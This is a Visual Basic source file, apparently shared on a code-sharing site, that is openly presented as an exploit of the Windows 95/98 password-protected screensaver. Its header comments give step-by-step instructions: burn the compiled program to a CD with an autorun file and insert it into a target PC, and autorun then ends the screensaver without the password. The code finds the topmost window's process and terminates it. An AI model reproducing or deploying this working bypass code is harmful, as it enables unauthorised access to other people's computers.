Attribute VB_Name = "modScreenSaverExploit"
Option Explicit
''''''''''''''''''''''''''''''''''How to use'''''''''''''''''''''''''''''''
'The target pc must have the auto insert notification enabled for the cd-rom
'Record an empty cd with autorun.inf and the compiled exe in the root directory.
'now suppose that the target pc is running a password-protected screensaver
'open the cd-rom door and put the recorded cd in..
'close the door and wait for the system to run the cd
'BoOm!! The screensaver is terminated... we used no password to log in :)
'
'
'Before running this source, you must accept these terms :
'                            (if you don't agree please don't run!)
'
'This source was created not only for administrative purposes..
'..but to show an exploit of windows 95/98 password-protected screensaver.
'You can freely use it as long as you don't damage any person's pc.
'I 'm not responsible for any data loss or hardware corruption!

'any comments appreciated...

'John Galanopoulos - GreekThought@yahoo.gr




'Here goes the source...
Private Const HIGH_PRIORITY_CLASS = &H80
' Indicates a process that must be executed immediately for it to run correctly.

Private Const PROCESS_TERMINATE = &H1
'Enables to terminate the process using the process handle in the
'TerminateProcess function.

Private Const SCREENSAVER_DEATH = HIGH_PRIORITY_CLASS + PROCESS_TERMINATE
'Custom contant to use for our purpose

Private Declare Function GetDesktopWindow Lib "user32" () As Long
'The GetDesktopWindow function returns a handle to the desktop window.
'The desktop window covers the entire screen.
'It is the area on top of which all icons and other windows are painted.

Private Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
'The GetTopWindow function examines the Z order of the child windows
'associated with the specified parent window and retrieves a handle
'to the child window at the top of the Z order.

Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
'The GetWindowThreadProcessId function retrieves the identifier of the thread
'that created the specified window and, optionally, the identifier of the process
'that created the window

Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
'The OpenProcess function opens an existing process object (using specific flags).

Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
'The TerminateProcess function terminates the specified process and all of its threads
'//

Public Sub Main()
  
  Dim Desktop_Handle As Long
  Dim TopWindow_Handle As Long
  Dim TopWindow_Retval As Long
  Dim ScreenSaver_ProcID As Long
  Dim scrOpProcID As Long
  
    On Error Resume Next

        Desktop_Handle = GetDesktopWindow()
        'First we get Desktop Window Handle
        
        TopWindow_Handle = GetTopWindow(Desktop_Handle)
        'Now we obtain the topmost window handle of our desktop window handle

        TopWindow_Retval = GetWindowThreadProcessId(TopWindow_Handle, ScreenSaver_ProcID)
        'Here we get the (topmost) screensaver process id
        
        scrOpProcID = OpenProcess(SCREENSAVER_DEATH, False, ScreenSaver_ProcID)
        'So now we can open our process (Screensaver) using our custom flag..
                
        TerminateProcess scrOpProcID, 0
        '..and here we terminate the process.
        ''Screensaver is now killed even if we have password-protected it!!!
        '
        'Is this a security breach or what???!!??
        
       Form1.Show
        ':-b
End Sub
'I have another submition for you to see:
'Visit : https://www.planet-source-code.com/xq/ASP/txtCodeId.29245/lngWId.1/qx/vb/scripts/ShowCode.htm

